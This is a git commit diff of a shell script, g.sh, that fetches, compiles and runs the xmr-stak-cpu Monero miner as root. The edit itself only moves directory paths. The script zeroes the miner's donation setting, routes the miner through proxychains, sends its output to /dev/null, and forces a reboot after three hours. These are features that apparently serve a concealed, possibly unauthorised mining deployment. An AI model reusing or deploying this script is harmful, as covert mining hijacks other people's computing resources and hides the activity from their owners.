bc944949738b04cab023ca5cee570b3f800e416e
gwillis9 <gwillis9@csc.com>
2017-06-20 17:50:06 +1000

    Update g.sh

--- g.sh
+++ g.sh
@@ -4,22 +4,22 @@ file="/flag2"
 if [ -f "$file" ]
 then
 	sudo apt-get install cmake -y
-	cd /m/test01
+	cd /xmr/xmr
 	sudo apt-get install libmicrohttpd-dev libssl-dev cmake build-essential -y
-	sudo rm -R /m/test01/xmr-stak-cpu
+	sudo rm -R /xmr/xmr/xmr-stak-cpu
 	sudo git clone --recursive https://github.com/fireice-uk/xmr-stak-cpu.git
-	cd /m/test01/xmr-stak-cpu
-	sudo sed -i 's/1.0/0.0/' /m/test01/xmr-stak-cpu/donate-level.h
+	cd /xmr/xmr/xmr-stak-cpu
+	sudo sed -i 's/1.0/0.0/' /xmr/xmr/xmr-stak-cpu/donate-level.h
 	sudo cmake -DCMAKE_LINK_STATIC=ON . -DMICROHTTPD_REQUIRED=OFF
 	sudo make
 	sudo make install
-	sudo chmod +x /m/test01/xmr-stak-cpu/bin/xmr-stak-cpu	
- 	sudo chmod +x /m/test01/proxychains-ng/proxychains4	
- 	sudo chmod +x /m/test01/proxychains-ng/libproxychains4.so
-	sudo cp /m/test01/xmr/config.txt /m/test01/xmr-stak-cpu/bin/config.txt
+	sudo chmod +x /xmr/xmr/xmr-stak-cpu/bin/xmr-stak-cpu	
+ 	sudo chmod +x /xmr/xmr/proxychains-ng/proxychains4	
+ 	sudo chmod +x /xmr/xmr/proxychains-ng/libproxychains4.so
+	sudo cp /xmr/xmr/xmr/config.txt /xmr/xmr/xmr-stak-cpu/bin/config.txt
         ( sleep 10800 ; sudo reboot ) & 
-	cd /m/test01/xmr-stak-cpu/bin/
-        sudo /m/test01/proxychains-ng/proxychains4 -f /m/test01/proxychains/proxychains.conf /m/test01/xmr-stak-cpu/bin/xmr-stak-cpu >/dev/null 2>&1
+	cd /xmr/xmr/xmr-stak-cpu/bin/
+        sudo /xmr/xmr/proxychains-ng/proxychains4 -f /xmr/xmr/proxychains/proxychains.conf /xmr/xmr/xmr-stak-cpu/bin/xmr-stak-cpu >/dev/null 2>&1
         sudo reboot   
 else
         sudo /bin/su -c "echo 'vm.nr_hugepages=128' >> /etc/sysctl.conf"
